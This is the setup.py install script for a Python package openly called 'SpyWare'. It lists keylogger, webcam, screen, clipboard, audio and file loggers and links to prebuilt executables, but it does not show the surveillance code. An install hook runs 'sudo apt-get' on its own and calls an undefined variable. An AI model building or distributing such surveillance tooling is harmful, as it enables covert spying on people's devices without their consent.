from sys import maxsize, executable, version_info
from setuptools.command.install import install
from setuptools import setup, find_packages
from os import system as exec_command
from platform import system


class PostInstallScript(install):

    """
    This class install the PyAudio module.
    """

    def is_64bit(self) -> bool:

        """
        This function returns True if python is in x64 else returns False.
        """

        return maxsize > 2 ** 32

    def install_pyaudio(self):

        """
        This function install the PyAudio module.
        """

        if system() == "Windows":
            v = f"{version_info.major}{version_info.minor}"

            whl_file = (
                f"PyAudio-0.2.11-cp{v}-cp{v}-win_amd64.whl"
                if self.is_64bit()
                else f"PyAudio-0.2.11-cp{v}-cp{v}-win32.whl"
            )
            exec_command(f'"{executable}" -m pip install "{whl_file}"')
        else:
            exec_command("sudo apt-get install portaudio19-dev python-pyaudio")
            packages.append("pyaudio")

    def run(self):

        """
        Install the package.
        """

        self.install_pyaudio()
        install.run(self)


setup(
    name="SpyWare",
    version="1.0.3",
    packages=find_packages(include=["SpyWare"]),
    install_requires=[
        "pyautogui",
        "opencv-python",
        "pillow",
        "pyperclip",
        "pynput",
    ],
    author="Maurice Lambert",
    author_email="mauricelambert434@gmail.com",
    maintainer="Maurice Lambert",
    maintainer_email="mauricelambert434@gmail.com",
    description="This package implements a complete SpyWare.",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    include_package_data=True,
    url="https://github.com/mauricelambert/SpyWare",
    project_urls={
        "Windows Executable (one file)": "https://github.com/mauricelambert/SpyWare/releases/download/v1.0.0/SpyWare.exe",
        "Windows Executable": "https://github.com/mauricelambert/SpyWare/releases/download/v1.0.0/SpyWare.zip",
        "Documentation": "https://mauricelambert.github.io/info/python/security/SpyWare/SpyWare.html",
        "Documentation Clipboard": "https://mauricelambert.github.io/info/python/security/SpyWare/ClipboardLogger.html",
        "Documentation Screenshot": "https://mauricelambert.github.io/info/python/security/SpyWare/ScreenLogger.html",
        "Documentation Domains": "https://mauricelambert.github.io/info/python/security/SpyWare/DomainsLogger.html",
        "Documentation Recorder": "https://mauricelambert.github.io/info/python/security/SpyWare/AudioLogger.html",
        "Documentation Keylogger": "https://mauricelambert.github.io/info/python/security/SpyWare/KeyLogger.html",
        "Documentation Webcam": "https://mauricelambert.github.io/info/python/security/SpyWare/WebcamLogger.html",
        "Documentation Files": "https://mauricelambert.github.io/info/python/security/SpyWare/FilesLogger.html",
        "Python executable": "https://mauricelambert.github.io/info/python/security/SpyWare.pyz",
        "Clipboard - Python executable": "https://mauricelambert.github.io/info/python/security/SpyWare/ClipboardLogger.pyz",
        "Screenshot - Python executable": "https://mauricelambert.github.io/info/python/security/SpyWare/ScreenLogger.pyz",
        "Domains - Python executable": "https://mauricelambert.github.io/info/python/security/SpyWare/DomainsLogger.pyz",
        "Recorder - Python executable": "https://mauricelambert.github.io/info/python/security/SpyWare/AudioLogger.pyz",
        "Keylogger - Python executable": "https://mauricelambert.github.io/info/python/security/SpyWare/KeyLogger.pyz",
        "Webcam - Python executable": "https://mauricelambert.github.io/info/python/security/SpyWare/WebcamLogger.pyz",
        "Files - Python executable": "https://mauricelambert.github.io/info/python/security/SpyWare/FilesLogger.pyz",
    },
    classifiers=[
        "Programming Language :: Python",
        "Development Status :: 5 - Production/Stable",
        "Topic :: Security",
        "Environment :: Console",
        "Natural Language :: English",
        "Programming Language :: Python :: 3.9",
        "Operating System :: POSIX :: Linux",
        "Operating System :: Microsoft :: Windows",
        "Operating System :: MacOS",
        "Topic :: Security",
    ],
    cmdclass={
        "install": PostInstallScript,
    },
    entry_points={
        "console_scripts": ["SpyWare = SpyWare:spyware"],
    },
    python_requires=">=3.6",
    keywords=[
        "KeyLogger",
        "SpyWare",
        "WebCam",
        "ClibBoard",
        "DNS Cache",
        "Screen",
        "Recorder",
        "Files",
        "Spy",
    ],
    platforms=["Windows", "Linux", "MacOS"],
    license="GPL-3.0 License",
)
